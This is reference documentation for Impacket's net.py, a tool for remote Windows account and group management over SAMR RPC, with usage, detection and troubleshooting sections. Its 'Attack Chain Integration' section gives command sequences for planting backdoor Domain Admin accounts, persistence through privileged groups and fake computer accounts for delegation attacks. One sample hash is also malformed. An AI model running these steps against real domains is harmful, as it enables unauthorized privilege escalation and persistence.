# net.py

## Overview
`net.py` is a Windows net.exe alternative tool in the Impacket suite. This tool is categorized under System Administration and provides functionality for remote Windows account and group management through RPC protocols. It serves as a cross-platform replacement for the Windows net.exe utility, enabling network administrators and penetration testers to manage user accounts, computer accounts, and group memberships remotely.

## Detailed Description
`net.py` implements a comprehensive SAMR (Security Account Manager Remote) RPC client that allows remote management of Windows user accounts, computer accounts, domain groups, and local groups. Unlike the native Windows net.exe command which requires local execution, this tool operates entirely over the network using RPC protocols, making it particularly valuable for remote administration and penetration testing scenarios.

The tool leverages the SAMR RPC interface to perform account enumeration, creation, deletion, and modification operations. It can manage both domain-level and local-level accounts, providing functionality equivalent to various net.exe commands but with the added benefit of remote execution capabilities.

### Key Features:
- **Remote Account Management**: Create, delete, enable, and disable user and computer accounts remotely
- **Group Management**: Manage domain groups and local groups including membership operations
- **Account Enumeration**: List all users, computers, and groups in a domain or local system
- **Detailed Account Information**: Query comprehensive user account details including group memberships
- **Multiple Authentication**: Support for password, hash, and Kerberos authentication methods
- **Cross-Platform Compatibility**: Works on Linux/Unix systems to manage Windows targets

### Technical Details:
- Uses SAMR (Security Account Manager Remote) RPC protocol
- Leverages LSA (Local Security Authority) RPC for SID translation and lookups
- Implements NTLM and Kerberos authentication protocols
- Compatible with all Windows versions that support SAMR RPC
- Operates over SMB named pipes (\\pipe\\samr and \\pipe\\lsarpc)

## Command Line Options

```
usage: net.py [-h] [-debug] [-ts] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] 
              [-dc-ip ip address] [-target-ip ip address] [-port {139,445}]
              target {user,computer,localgroup,group} ...

SAMR rpc client implementation.

Required Arguments:
  target                [[domain/]username[:password]@]<targetName or address>

Subcommands:
  {user,computer,localgroup,group}
    user                 Enumerate all domain/local user accounts
    computer             Enumerate all computers in domain level
    localgroup           Enumerate local groups (aliases) of local computer
    group                Enumerate domain groups registered in domain controller

User Options:
  -name NAME            Display single user information
  -create NAME          Add new user account to domain/computer
  -remove NAME          Remove existing user account from domain/computer
  -newPasswd PASSWORD   New password to set for creating account
  -enable NAME          Enables account
  -disable NAME         Disables account

Computer Options:
  -name NAME            Display single computer information
  -create NAME          Add new computer account to domain
  -remove NAME          Remove existing computer account from domain
  -newPasswd PASSWORD   New password to set for creating account
  -enable NAME          Enables account
  -disable NAME         Disables account

Group Options (localgroup/group):
  -name NAME            Operate on single specific group account
  -join USER            Add user account to specific group
  -unjoin USER          Remove user account from specific group

General Options:
  -debug                Turn DEBUG output ON
  -ts                   Adds timestamp to every logging output

Authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey hex key       AES key for Kerberos Authentication (128 or 256 bits)

Connection:
  -dc-ip ip address     IP Address of the domain controller
  -target-ip ip address IP Address of the target machine
  -port {139,445}       Destination port to connect to SMB Server (default: 445)
```

## Usage Examples

### User Account Management
```bash
# Enumerate all domain users
python3 net.py domain.com/admin:password@target.domain.com user

# Get detailed information about specific user
python3 net.py domain.com/admin:password@target.domain.com user -name john

# Create new user account
python3 net.py domain.com/admin:password@target.domain.com user -create newuser -newPasswd Password123!

# Enable/disable user account
python3 net.py domain.com/admin:password@target.domain.com user -enable john
python3 net.py domain.com/admin:password@target.domain.com user -disable john

# Remove user account
python3 net.py domain.com/admin:password@target.domain.com user -remove olduser
```

### Computer Account Management
```bash
# Enumerate all domain computers
python3 net.py domain.com/admin:password@dc.domain.com computer

# Get information about specific computer
python3 net.py domain.com/admin:password@dc.domain.com computer -name WORKSTATION01$

# Create new computer account
python3 net.py domain.com/admin:password@dc.domain.com computer -create NEWPC$ -newPasswd Password123!

# Remove computer account
python3 net.py domain.com/admin:password@dc.domain.com computer -remove OLDPC$
```

### Group Management
```bash
# Enumerate all domain groups
python3 net.py domain.com/admin:password@dc.domain.com group

# List members of specific domain group
python3 net.py domain.com/admin:password@dc.domain.com group -name "Domain Admins"

# Add user to domain group
python3 net.py domain.com/admin:password@dc.domain.com group -name "Domain Admins" -join eviluser

# Remove user from domain group
python3 net.py domain.com/admin:password@dc.domain.com group -name "Domain Admins" -unjoin eviluser
```

### Local Group Management
```bash
# Enumerate local groups (aliases)
python3 net.py domain.com/admin:password@target.domain.com localgroup

# List members of local Administrators group
python3 net.py domain.com/admin:password@target.domain.com localgroup -name Administrators

# Add user to local Administrators group
python3 net.py domain.com/admin:password@target.domain.com localgroup -name Administrators -join backdoor

# Remove user from local group
python3 net.py domain.com/admin:password@target.domain.com localgroup -name Administrators -unjoin backdoor
```

### Authentication Examples
```bash
# Using NTLM hash authentication
python3 net.py -hashes :5e884898da28047151d0e56f8dc6292773603d0d domain.com/admin@target.domain.com user

# Using Kerberos authentication
python3 net.py -k domain.com/admin@target.domain.com user

# Using AES key for Kerberos
python3 net.py -aesKey 32characterhexkey -k domain.com/admin@target.domain.com user

# Anonymous enumeration (if allowed)
python3 net.py target.domain.com/ user
```

### Advanced Usage
```bash
# Debug mode for troubleshooting
python3 net.py -debug domain.com/admin:password@target.domain.com user

# With timestamps
python3 net.py -ts domain.com/admin:password@target.domain.com user

# Specify domain controller explicitly
python3 net.py -dc-ip 192.168.1.10 domain.com/admin:password@target.domain.com user

# Connect over SMB port 139
python3 net.py -port 139 domain.com/admin:password@target.domain.com user
```

## Attack Chain Integration

### Domain Enumeration and Reconnaissance
```bash
# Step 1: Enumerate all domain users for target identification
python3 net.py domain.com/user:password@dc.domain.com user > domain_users.txt

# Step 2: Identify high-value accounts and service accounts
python3 net.py domain.com/user:password@dc.domain.com user -name krbtgt
python3 net.py domain.com/user:password@dc.domain.com user -name Administrator

# Step 3: Enumerate domain groups to understand privilege structure
python3 net.py domain.com/user:password@dc.domain.com group > domain_groups.txt
python3 net.py domain.com/user:password@dc.domain.com group -name "Domain Admins"
python3 net.py domain.com/user:password@dc.domain.com group -name "Enterprise Admins"

# Step 4: Check computer accounts for potential targets
python3 net.py domain.com/user:password@dc.domain.com computer > domain_computers.txt
```

### Privilege Escalation Through Account Creation
```bash
# Step 1: Create backdoor user account
python3 net.py domain.com/admin:password@dc.domain.com user -create backdoor -newPasswd ComplexPass123!

# Step 2: Add backdoor user to Domain Admins group
python3 net.py domain.com/admin:password@dc.domain.com group -name "Domain Admins" -join backdoor

# Step 3: Verify new account privileges
python3 net.py domain.com/admin:password@dc.domain.com user -name backdoor
python3 net.py domain.com/admin:password@dc.domain.com group -name "Domain Admins"

# Step 4: Use new account for persistent access
python3 psexec.py domain.com/backdoor:ComplexPass123!@target.domain.com
```

### Local Privilege Escalation
```bash
# Step 1: Enumerate local groups on target system
python3 net.py domain.com/user:password@target.domain.com localgroup

# Step 2: Check current members of local Administrators group
python3 net.py domain.com/user:password@target.domain.com localgroup -name Administrators

# Step 3: Add domain user to local Administrators group
python3 net.py domain.com/admin:password@target.domain.com localgroup -name Administrators -join "DOMAIN\user"

# Step 4: Verify local admin access
python3 psexec.py domain.com/user:password@target.domain.com
```

### Persistence Through Group Membership
```bash
# Step 1: Identify existing service accounts
python3 net.py domain.com/admin:password@dc.domain.com user | grep -i service

# Step 2: Add regular user to privileged groups
python3 net.py domain.com/admin:password@dc.domain.com group -name "Backup Operators" -join regularuser
python3 net.py domain.com/admin:password@dc.domain.com group -name "Server Operators" -join regularuser

# Step 3: Verify persistence mechanism
python3 net.py domain.com/regularuser:password@dc.domain.com group -name "Backup Operators"
```

### Computer Account Manipulation
```bash
# Step 1: Create new computer account for delegation attacks
python3 net.py domain.com/admin:password@dc.domain.com computer -create FAKE$ -newPasswd Password123!

# Step 2: Verify computer account creation
python3 net.py domain.com/admin:password@dc.domain.com computer -name FAKE$

# Step 3: Use computer account for further attacks
python3 getST.py -spn cifs/target.domain.com domain.com/FAKE$:Password123!

# Step 4: Clean up computer account if needed
python3 net.py domain.com/admin:password@dc.domain.com computer -remove FAKE$
```

## Prerequisites
- Python 3.x with Impacket installed
- Valid domain credentials or local administrator credentials
- Network access to target system via SMB (ports 139 or 445)
- Understanding of Windows account and group management concepts
- Knowledge of SAMR RPC protocol basics

## Account Types and Scope

### User Accounts
- **Domain Users**: Managed at domain controller level
- **Local Users**: Managed on individual systems
- **Service Accounts**: Special accounts for running services
- **Built-in Accounts**: System-defined accounts (Administrator, Guest, etc.)

### Computer Accounts
- **Workstation Accounts**: End-user computers ($)
- **Server Accounts**: Server systems ($)
- **Domain Controller Accounts**: DC computer accounts

### Group Types
- **Domain Groups**: Global and universal groups managed by domain controller
- **Local Groups (Aliases)**: Local system groups like Administrators, Users, etc.
- **Built-in Groups**: System-defined groups with specific privileges

## Security Considerations

### Detection Indicators
- **SAMR RPC Activity**: Unusual SAMR protocol usage patterns
- **Account Enumeration**: Bulk queries of user/computer/group information
- **Account Creation**: New user or computer account creation events
- **Group Modification**: Changes to privileged group memberships
- **Authentication Patterns**: Unusual authentication attempts or methods

### Defensive Measures
- **RPC Filtering**: Restrict SAMR RPC access to authorized systems only
- **Account Monitoring**: Monitor for suspicious account creation/modification
- **Group Membership Auditing**: Track changes to privileged groups
- **Authentication Security**: Implement strong authentication policies
- **Network Segmentation**: Limit SMB access between network segments

## Common Issues and Troubleshooting

### Access Denied Errors
```bash
# Error: Access denied when enumerating accounts
# Solution: Ensure user has appropriate privileges
# Domain accounts may need "Log on as a service" or domain admin rights
python3 net.py -debug domain.com/user:password@target.domain.com user
```

### Connection Issues
```bash
# Error: SMB connection failed
# Solution: Check network connectivity and SMB service availability
python3 net.py -target-ip 192.168.1.100 domain.com/user:password@target.domain.com user

# Try different SMB port
python3 net.py -port 139 domain.com/user:password@target.domain.com user
```

### Authentication Failures
```bash
# Error: Authentication failed
# Solution: Verify credentials and authentication method
python3 net.py -no-pass -k domain.com/user@target.domain.com user  # Kerberos
python3 net.py -hashes :ntlmhash domain.com/user@target.domain.com user  # Hash auth
```

### Group Operation Errors
```bash
# Error: "argument '-name' is required with join/unjoin operations"
# Solution: Always specify group name when joining/unjoining users
python3 net.py domain.com/admin:password@dc.domain.com group -name "Domain Users" -join newuser
```

### Account Creation Issues
```bash
# Error: "argument '-newPasswd' is required for creating new account"
# Solution: Always specify password when creating accounts
python3 net.py domain.com/admin:password@dc.domain.com user -create newuser -newPasswd Password123!
```

## Related Tools
- [psexec.py](psexec.md) - Execute commands using created accounts
- [smbclient.py](smbclient.md) - Access file shares with account credentials
- [secretsdump.py](secretsdump.md) - Extract secrets using privileged accounts
- [addcomputer.py](addcomputer.md) - Alternative computer account creation method
- [GetUserSPNs.py](GetUserSPNs.md) - Find service accounts for Kerberoasting
- [lookupsid.py](lookupsid.md) - Enumerate accounts using SID lookups

---

*This documentation is based on the actual source code and functionality of net.py from Impacket.*
